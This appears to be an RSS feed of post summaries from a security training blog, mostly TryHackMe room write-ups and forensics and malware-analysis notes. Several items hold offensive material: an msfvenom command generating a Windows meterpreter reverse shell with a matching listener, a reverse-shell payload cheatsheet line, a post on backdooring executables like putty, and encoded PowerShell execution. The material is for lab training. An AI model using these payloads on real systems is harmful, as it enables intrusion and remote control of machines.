Task 2.2 Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-ice/</link></item><item><title>TryHackMe Room Hackpark</title><pubDate>Sat, 19 Jun 2021 19:38:27 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>HackPark Room link : HackPark
task 01: Deploy the vulnerable Windows machine This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.
Flags Flag-ID question 1 Deploy the machine and access its web server. 2 Whats the name of the clown displayed on the homepage? download the img and do a reverse Image search ans is PENNYWISE task 02: Using Hydra to brute-force a login 1 : find the directory using gobuster</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-hackpark/</link></item><item><title>TryHackME Room Kenobi</title><pubDate>Thu, 10 Jun 2021 21:22:32 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>kenobi Task 01 : Deploy the vulnerable machine Flag-ID question 1 Make sure you&amp;rsquo;re connected to our network and deploy the machine 2 Scan the machine with nmap, how many ports are open? Task 02: Enumerating Samba for shares cheat sheet nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP] smbclient //&amp;lt;ip&amp;gt;/anonymous smbget -R smb://&amp;lt;ip&amp;gt;/anonymous #recursive download files nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.233.45 #show mounts Flag-ID question 1 Using the nmap command above, how many shares have been found?</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-kenobi/</link></item><item><title>TryHackMe Room Vulnversity</title><pubDate>Wed, 09 Jun 2021 20:10:48 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Vulnversity TASK 01: Deploy the machine TASK 02: Reconnaissance Tools
Nmap CheatSheet Flags Flag ID Questions 1 There are many nmap &amp;ldquo;cheatsheets&amp;rdquo; online that you can use too. N\A 2 Scan the box, how many ports are open? 3 What version of the squid proxy is running on the machine? 4 How many ports will nmap scan if the flag -p-400 was used? 400 5 Using the nmap flag -n what will it not resolve?</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-vulnversity/</link></item><item><title>Thm Room Web Fundamentals</title><pubDate>Tue, 08 Jun 2021 11:04:18 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Web Fundamentals Task 01: Introduction and objectives Flags 1: n/a Task 02: How do we load websites? Flags 2 Flag ID Questions Ans 1 What request verb is used to retrieve page content? GET 2 What port do web servers normally listen on? 80 3 What&amp;rsquo;s responsible for making websites look fancy? CSS Task 03: More HTTP - Verbs and request formats HTTP response status codes
HTTP response status codes indicate whether a specific HTTP request has been successfully completed.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-webfundamentals/</link></item><item><title>Backdooring EXE Files</title><pubDate>Mon, 07 Jun 2021 20:20:16 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Backdooring EXE Files overview Creating customized backdoored executables often took a long period of time to do manually as attackers. The ability to embed a Metasploit Payload in any executable that you want is simply brilliant. When we say any executable, it means any executable. You want to backdoor something you download from the internet? How about iexplorer? Or explorer.exe or putty, any of these would work. The best part about it is its extremely simple.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/cs-hijackputty-msfvenom/</link></item><item><title>TryHackMe Writeup REMnux - The Redux</title><pubDate>Tue, 01 Jun 2021 09:49:05 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>REMnux - The Redux Profile Support Task 01: introduction Welcome to the redux of REMnux.
Since the release of the previous REMnux room, REMnux has had substantial changes, rendering the previous room outdated and impossible to complete.
I have taken the opportunity to recreate the room covering REMnux from scratch, taking a very different approach to ensure you get to use all the facilities that make REMnux unique.
How Have I Designed This Room Differently?</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-malremnuxv2/</link></item><item><title>TryHackMe BasicMalwareRE Writeup</title><pubDate>Mon, 31 May 2021 08:20:27 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>BasicMalwareRE Profile Support I learnt from this Book: Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software Task 01: Introduction These challenges are aimed towards learning about the &amp;ldquo;Static Analysis&amp;rdquo; technique used to analyze the malware. The main aim for this room is not to used any types of debuggers neither the executable&amp;rsquo;s/programs should be run on any platform. You are required to answer all the questions without even using the debugger and even not executing the executable&amp;rsquo;s/programs.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-basicmalwarere/</link></item><item><title>Try Hack ME Room Malstrings</title><pubDate>Mon, 31 May 2021 00:21:19 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>MAL: Strings Profile Support Task 01: What are &amp;ldquo;strings&amp;rdquo;? MP: Strings What are &amp;ldquo;strings&amp;rdquo;? From a programming perspective, &amp;ldquo;strings&amp;rdquo; is the term given for data handled by an application. At a broader view, these pieces of data are used to store information such as text to numerical values.
For example, let&amp;rsquo;s say we have an application such as a calculator. A user will have to input two numerical values (e.g. 1 and 5) combined with an operator (e.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-malstrings/</link></item><item><title>Try Hack ME Room Malware Introductory</title><pubDate>Sat, 29 May 2021 00:08:19 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>MAL: Malware Introductory Profile Support Task 01: What is the Purpose of Malware Analysis? Malware is such a prevalent topic within Cybersecurity, and often an unfortunately recurring theme among global news today.
Not only is malware analysis a form of incidence response, but it is also useful in understanding how the behaviours of variants of malware result in their respective categorisation. This room will be a practical introduction to the techniques and tools used throughout malware analysis - albeit brief, I hope to expand on these techniques a lot more in-depth within the future.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-malmalintroductory/</link></item><item><title>Try Hack Me Room History of Malware</title><pubDate>Fri, 28 May 2021 00:43:47 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>History of Malware Join this room to learn about the first forms of malware and how they turned into the malicious code we see today.
Profile Support Task 01: Introduction &amp;ldquo;Malware&amp;rdquo; consists of two words combined; malicious and software. Typically, Malware is designed to cause damage to Computers or Networks, this may be on a very large scale or only on a local network (LAN).
Task 02: The Creeper Program Concepts of Malicious Software have been around since 1949, and one of the first known theories was created by John von Neumann.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-historyofmalware/</link></item><item><title>Thm Room Autopsy</title><pubDate>Thu, 27 May 2021 00:31:13 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Autopsy Learn how to use Autopsy to investigate artifacts from a disk image. Use your knowledge to investigate an employee who is being accused of leaking private company data.
Profile Support Task 01: Introduction What is Autopsy?
The official description: &amp;ldquo;Autopsy is the premier open source forensics platform which is fast, easy-to-use, and capable of analyzing all types of mobile devices and digital media. Its plug-in architecture enables extensibility from community-developed or custom-built modules.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-btautopsye0/</link></item><item><title>Investigating Windows</title><pubDate>Tue, 25 May 2021 20:09:18 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Investigating Windows A windows machine has been hacked, its your job to go investigate this windows machine and find clues to what the hacker might have done.
Profile Support Task 01: Investigating Windows Explanation Flg 2 looking into eventviewer log for EventID 4624. Ref: read
Flag 3 open CMD -&amp;gt; type net user John look for Last Logon
Flag 4 while booting up we see the IP in CMD Flag 5 CMD: net localgroup administrators</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/investigatingwindows/</link></item><item><title>Try Hack me Room Volatility</title><pubDate>Sun, 23 May 2021 23:09:45 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Volatility Learn how to perform memory forensics with Volatility!
Profile Support Task 01: Intro Volatility is a free memory forensics tool developed and maintained by Volatility labs. Regarded as the gold standard for memory forensics in incident response, Volatility is wildly expandable via a plugins system and is an invaluable tool for any Blue Teamer.
Task 02: Obtaining Memory Samples Obtaining a memory capture from machines can be done in numerous ways, however, the easiest method will often vary depending on what you&amp;rsquo;re working with.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-bpvolatility/</link></item><item><title>Domino’s India Data Leak Of 18 Cr Orders Resurfaces; Customer Location, Mobile Numbers Exposed</title><pubDate>Sat, 22 May 2021 19:56:16 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>update: Site seems to be down for now!
Domino&amp;rsquo;s India, which is owned by Jubilant FoodWorks has apparently fallen victim to a massive data leak. Hackers have reportedly published crucial data on the dark web. The data contains details of lakhs of Domino&amp;rsquo;s India customers and employees. As per reports, sensitive customer data like names, phone numbers, and credit card details have been accessed by hackers.
Image Credits: Pixabay/Twitter - @dominos_india</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/scripts-dominos/</link></item><item><title>Try Hack Me Room Attacking Kerberos</title><pubDate>Thu, 20 May 2021 23:25:07 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Attacking Kerberos Profile Support Task 01: Introduction What is Kerberos? - Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more &amp;ldquo;secure&amp;rdquo; than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-attackingkerberos/</link></item><item><title>Try Hack Me Room Attacktivedirectory</title><pubDate>Tue, 18 May 2021 23:58:19 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Attacktivedirectory Profile Support Task 01: Deploy The Machine Walkthough how to access VM &amp;amp; Attacker VM
Task 02: Setup Installing Impacket:
Whether you&amp;rsquo;re on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install correctly. Here&amp;rsquo;s some instructions that may help you install it correctly!
First, you will need to clone the Impacket Github repo onto your box. The following command will clone Impacket into /opt/impacket:
git clone https://github.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-attacktivedirectory/</link></item><item><title>Try Hack Me Room Osquery</title><pubDate>Sun, 16 May 2021 23:54:39 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Osquery Profile Support TASK 1 : Introduction Osquery is an open-source tool created by Facebook. With Osquery, Security Analysts, Incident Responders, Threat Hunters, etc., can query an endpoint (or multiple endpoints) using SQL syntax. Osquery can be installed on multiple platforms: Windows, Linux, macOS, and FreeBSD.
Many well-known companies, besides Facebook, either use Osquery, utilize osquery within their tools, and/or look for individuals who know Osquery.
As of today (March 2021), Github and AT&amp;amp;T seek individuals who have experience with Osquery.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-osquery/</link></item><item><title>Try Hack Me Room Room Openvas</title><pubDate>Mon, 10 May 2021 01:36:51 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OpenVas Room Subscription Only
Task 1: Introduction OpenVAS, an application used to scan endpoints and web applications to identify and detect vulnerabilities. It is commonly used by corporations as part of their mitigation solutions to quickly identify any gaps in their production or even development servers or applications. This is not an end all be all solution but can help to get rid of any common vulnerabilities that may have slipped through the cracks.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-openvas/</link></item><item><title>Try Hack ME Room Zerologon</title><pubDate>Mon, 10 May 2021 01:22:37 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Zero Logon - The Zero Day Angle Room Subscription Only About The vulnerability - On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.
Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/thm-room-zerologon/</link></item><item><title>Cyber Security Interview Questions With Answers</title><pubDate>Fri, 07 May 2021 19:38:21 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>50 Cyber Security Interview Questions (With Answers) Top Cyber Security Interview Questions Explain Cryptography It is the science of protecting data from third-party using various methods. It is used to protect sensitive information that shouldn’t be disclosed to anyone other than the owners of the information.
Differentiate between Symmetric and Asymmetric encryption Symmetric encryption – In this type of encryption, the same key is used for encryption
and decryption of data.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/cyber-security-interview-questions-with-answers/</link></item><item><title>Active Directory Exploitation Cheat Sheet</title><pubDate>Fri, 07 May 2021 14:00:36 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Active Directory Exploitation Cheat Sheet A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.
This cheat sheet is inspired by the PayloadAllTheThings repo.
Summary Active Directory Exploitation Cheat Sheet Summary Tools Domain Enumeration Using PowerView Using AD Module Using BloodHound Useful Enumeration Tools Local Privilege Escalation Useful Local Priv Esc Tools Lateral Movement Powershell Remoting Remote Code Execution with PS Credentials Import a powershell module and execute its functions remotely Executing Remote Stateful commands Mimikatz Useful Tools Domain Privilege Escalation Kerberoast ASREPRoast Password Spray Attack Force Set SPN Abusing Shadow Copies List and Decrypt Stored Credentials using Mimikatz Unconstrained Delegation Constrained Delegation Resource Based Constrained Delegation DNSAdmins Abuse Abusing Active Directory-Integraded DNS Abusing Backup Operators Group Abusing Exchange Weaponizing Printer Bug Abusing ACLs Abusing IPv6 with mitm6 SID History Abuse Exploiting SharePoint Zerologon Exploit Domain Persistence Golden Ticket Attack DCsync Attack Silver Ticket Attack Skeleton Key Attack DSRM Abuse Custom SSP Cross Forest Attacks Trust Tickets Abuse MSSQL Servers Breaking Forest Trusts Tools Powersploit PowerUpSQL Powermad Impacket Mimikatz Rubeus -&amp;gt; Compiled Version BloodHound AD Module ASREPRoast Domain Enumeration Using PowerView Powerview v.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/</link></item><item><title>Notes OSIModel Explained</title><pubDate>Sun, 25 Apr 2021 20:20:59 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OSI Model Explained Packet Details You can double click on a packet in capture to open its details. Packets consist of 5 to 7 layers based on the OSI model. We will go over all of them in an HTTP packet from a sample capture
Looking above we can see 7 distinct layers to the packet: frame/packet, source [MAC], source [IP], protocol, protocol errors, application protocol, and application data. Below we will go over the layers in more detail.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/notes-osimodel-explained/</link></item><item><title>Notes OSIModel</title><pubDate>Wed, 21 Apr 2021 20:01:52 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OSI Model OverView The OSI (Open Systems Interconnection) Model is a standardised model which we use to demonstrate the theory behind computer networking. In practice, it&amp;rsquo;s actually the more compact TCP/IP model that real-world networking is based off; however the OSI model, in many ways, is easier to get an initial understanding from.
The OSI model consists of seven layers:
Layers Application presentation session transport Network Data Link Physical There are many mnemonics floating around to help you learn the layers of the OSI model &amp;ndash; search around until you find one that you like.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/notes-osimodel/</link></item><item><title>Notes Stego</title><pubDate>Wed, 21 Apr 2021 17:47:23 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Steganography - A list of useful tools and resources Steganography Steganography is hiding a file or a message inside of another file , there are many fun steganography CTF challenges out there where the flag is hidden in an image , audio file or even other types of files. Here is a list of the most tools I use and some other useful resources.
Note : This list will be updated regularly , feel free to pm if you have any suggestions</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/notes-stego/</link></item><item><title>Forensic Tools</title><pubDate>Tue, 13 Apr 2021 21:15:35 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Forensics Tools A list of free and open source forensics analysis tools and other resources.
Forensics Tools Collections Tools Distributions Frameworks Live forensics Acquisition Imageing Carving Memory Forensics Network Forensics Windows Artifacts NTFS/MFT Processing OS X Forensics Mobile Forensics Docker Forensics Browser Artifacts Timeline Analysis Disk image handling Decryption Management Picture Analysis Steganography Metadata Forensics Website Forensics Learn Forensics CTFs Resources Books File System Corpora Twitter Blogs Other Related Awesome Lists Collections DFIR – The definitive compendium project - Collection of forensic resources for learning and research.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/ref-forensic/</link></item><item><title>Notes Gnupg</title><pubDate>Tue, 13 Apr 2021 16:57:30 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>How To Use GPG to Encrypt and Sign Messages Introduction GPG, or GNU Privacy Guard, is a public key cryptography implementation. This allows for the secure transmission of information between parties and can be used to verify that the origin of a message is genuine.
In this guide, we will discuss how GPG works and how to implement it. We will be using an Ubuntu 16.04 server for this demonstration, but will include instructions for other distributions as well.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/notes-gnupg/</link></item><item><title>Msf Runscript</title><pubDate>Wed, 07 Apr 2021 15:25:21 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>WRITING METERPRETER SCRIPTS There are a few things you need to keep in mind when creating a new Meterpreter script.
Not all versions of Windows are the same Some versions of Windows have security countermeasures for some of the commands Not all command line tools are in all versions of Windows Some of the command line tools switches vary depending on the version of Windows For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/msf-runscript/</link></item><item><title>Intro Bash</title><pubDate>Sat, 03 Apr 2021 18:54:43 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Getting started {: .-three-column}
Introduction {: .-intro}
This is a quick reference to getting started with Bash scripting.
Learn bash in y minutes (learnxinyminutes.com) Bash Guide (mywiki.wooledge.org) Example #!/usr/bin/env bash NAME=&amp;#34;John&amp;#34; echo &amp;#34;Hello $NAME!&amp;#34; Variables NAME=&amp;#34;John&amp;#34; echo $NAME echo &amp;#34;$NAME&amp;#34; echo &amp;#34;${NAME}!&amp;#34; String quotes NAME=&amp;#34;John&amp;#34; echo &amp;#34;Hi $NAME&amp;#34; #=&amp;gt; Hi John echo &amp;#39;Hi $NAME&amp;#39; #=&amp;gt; Hi $NAME Shell execution echo &amp;#34;I&amp;#39;m in $(pwd)&amp;#34; echo &amp;#34;I&amp;#39;m in `pwd`&amp;#34; # Same See Command substitution</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/intro-bash/</link></item><item><title>Powershell Empire</title><pubDate>Fri, 02 Apr 2021 18:47:08 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Prereq install pip3 (python Package installer) sudo apt install python3-pip -y Install Poetry sudo pip3 install poetry install Git sudo apt install git -y Install Powershell - Empire git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install sudo poetry run python empire Hacking generate a listener (http) (Empire) &amp;gt; uselistener http (Empire: listeners/http) &amp;gt; info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/powershell-empire-install/</link></item><item><title>Msfvenom Psh</title><pubDate>Thu, 01 Apr 2021 16:14:32 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>meterpreter reverse shell with powershell Create Shell root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=443 -f psh -o meterpreter-64.ps1 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 510 bytes Final size of psh file: 3255 bytes Saved as: meterpreter-64.ps1 Setup listener msfconsole -x &amp;#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j&amp;#34; Interact .</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/msfvenom-psh/</link></item><item><title>Msfvenom Cheatsheet</title><pubDate>Thu, 01 Apr 2021 16:11:01 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>MSFVenom Cheatsheet Single Page Cheatsheet for common MSF Venom One Liners
Available in PDF, DOCX and Markdown format! PDF and DOCX versions contain the payload size in bytes and a few more commands.
MSFVenom Cheatsheet MSFVenom Payload Generation One-Liner Description msfvenom -l payloads List available payloads msfvenom -p PAYLOAD &amp;ndash;list-options List payload options msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &amp;gt; shell.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/msfvenom-cheatsheet/</link></item><item><title>Basic Linux</title><pubDate>Fri, 26 Mar 2021 20:24:44 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Overview Class Practical for Linux Basic Scripting
Hello {Name} #!/bin/bash echo &amp;#34;Hello, $1&amp;#34; Output bash hello.sh Mentor Hello Mentor Age Check #!/bin/bash #user-input echo -n &amp;#34;Enter Your Age: &amp;#34; read VAR #function if [[ $VAR -gt 21 ]] then echo &amp;#34;You&amp;#39;re Adult&amp;#34; else echo &amp;#34;Nope!&amp;#34; fi OutPut bash age.sh 19 Nope!</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/excelr-basic-linux/</link></item><item><title>Ps Enc</title><pubDate>Thu, 25 Mar 2021 20:01:50 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Powershell Enc $pt=&amp;#39;echo &amp;#34;Hello $env:username&amp;#34;&amp;#39; $bytes=[System.Text.Encoding]::Unicode.GetBytes($pt) $enc=[Convert]::ToBase64String($bytes) $enc ZQBjAGgAbwAgACIASABlAGwAbABvACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAiAA== Run the encoded code powershell.exe -enc &amp;#34;ZQBjAGgAbwAgACIASABlAGwAbABvACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAiAA==&amp;#34;</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/ps-enc/</link></item><item><title>Introduction to Vapt</title><pubDate>Sun, 21 Mar 2021 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Vulnerability Assessment and Penetration Testing (VAPT) Vulnerability Assessment and Penetration Testing (VAPT) are both security services that focus on identifying vulnerabilities in the network, server and system infrastructure. Both the services serves a different purpose and are carried out to achieve different but complimentary goals.
Vulnerability Assessment focuses on internal organizational security, while Penetration Testing focuses on external real-world risk.
What is Vulnerability Assessment (VA)? A Vulnerability Assessment is a rapid automated review of network devices, servers and systems to identify key vulnerabilities and configuration issues that an attacker may be able to take advantage off.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/intro-vapt/</link></item><item><title>Phishing Attack</title><pubDate>Sun, 21 Mar 2021 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Overview: Even though the internet is one of the man’s great creation, but it has remained as a root cause for many cyber attacks. Let us discuss about cyber punk who is the root cause for many data breaches that has happened till date.
Phishing is a type of social engineering attack, where the attacker generally tries to impersonate as a legitimate person to get some sensitive credentials like [username, passwords, etc] of the target.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/blog2/</link></item><item><title>Vulnerable Apps, Servers, and Websites!</title><pubDate>Sun, 21 Mar 2021 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>overview The following is a collection of vulnerable servers (VMs) or websites that you can use to practice your skills (sorted alphabetically).
Learning Platforms and VMs VulnHub Hack the Box TryHackMe eLearn Security PentesterLab bWAPP CloudGoat Damn Small Vulnerable Web Damn Vulnerable ARM Router (DVAR) Damn Vulnerable iOS Application (DVIA) Damn Vulnerable Web App (DVWA) Damn Vulnerable Web Services Damn Vulnerable WordPress DOMXSS Extreme Vulnerable Node Application(XVNA) Game of Hacks Gruyere Hack This Site Hack This Hack Yourself first Hackazon HellBound Hackers Kubernetes Goat Metasploitable2 Metasploitable3 Over The Wire Wargames OWASP Juice Shop OWASP Mutillidae II Peruggia PortSwigger Web Security Academy RootMe Samurai Web Testing Framework Server-Side Request Forgery (SSRF) vulnerable Lab Snyk exploit-workshop Try2Hack Vicnum Vulnerable Single Sign-On (SSO) Web Security Dojo WebGoat XXE Lab WebSploit Labs WebSploit Labs (created and maintained by Omar Ωr Santos) Mayhem - vulnerable container created by Omar Ωr for Mayhem 2020 RTOV-Hackme - vulnerable container created by Omar Ωr for DEF CON 27 RTV-Safemode - vulnerable container created by Omar Ωr for DEF CON Safemode</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/blog1/</link></item><item><title>Me</title><pubDate>Sun, 21 Mar 2021 20:59:00 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description/><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/about/me/</link></item><item><title>Volatility Installation in Linux</title><pubDate>Wed, 17 Mar 2021 01:00:08 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>How to Install Volatility 2.6 in Kali Volatility is no longer packaged with new Kali releases, but can be manually installed.
┌──(kali㉿kali)-[~/volatility] └─$ vol.py Volatility Foundation Volatility Framework 2.6.1 *** Failed to import volatility.plugins.registry.shutdown (ImportError: No module named Crypto.Hash) *** Failed to import volatility.plugins.getservicesids (ImportError: No module named Crypto.Hash) *** Failed to import volatility.plugins.timeliner (ImportError: No module named Crypto.Hash) *** Failed to import volatility.plugins.malware.apihooks (NameError: name &amp;#39;distorm3&amp;#39; is not defined) *** Failed to import volatility.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/vol2-installation/</link></item><item><title>Splunk Sysmon Configuration</title><pubDate>Thu, 11 Mar 2021 01:45:35 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Configure your Splunk Universal forwarder to send Sysmon logs to Splunk Okay locate your input.conf file and edit with your favorite text editor. It should be located somewhere similar to this
C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf and add the following
[WinEventLog://Microsoft-Windows-Sysmon/Operational] checkpointInterval = 5 current_only = 0 disabled = 0 start_from = oldest</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/splunk-sysmon/</link></item><item><title>Mobile App pentesting</title><pubDate>Tue, 09 Mar 2021 21:23:59 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Mobile Application Penetration Testing Cheat Sheet The Mobile App Pentest cheat sheet was created to provide concise collection of high value information on specific mobile application penetration testing topics and checklist, which is mapped OWASP Mobile Risk Top 10 for conducting pentest.
